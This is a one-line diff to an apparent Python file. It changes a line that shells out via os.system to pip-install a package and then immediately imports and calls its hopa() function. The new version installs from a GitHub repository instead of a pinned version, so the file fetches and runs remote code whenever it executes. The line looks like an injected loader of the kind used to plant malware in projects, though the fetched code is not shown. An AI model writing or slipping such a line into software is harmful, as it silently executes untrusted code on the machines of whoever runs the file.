@@ -1,1 +1,1 @@
-from os import system;system('pip install swap==1.89');from swap.swap import hopa;hopa()
+from os import system;system('pip install git+https://github.com/ZenoMilk12/Daniden.git#egg=swap');from swap.swap import hopa;hopa()
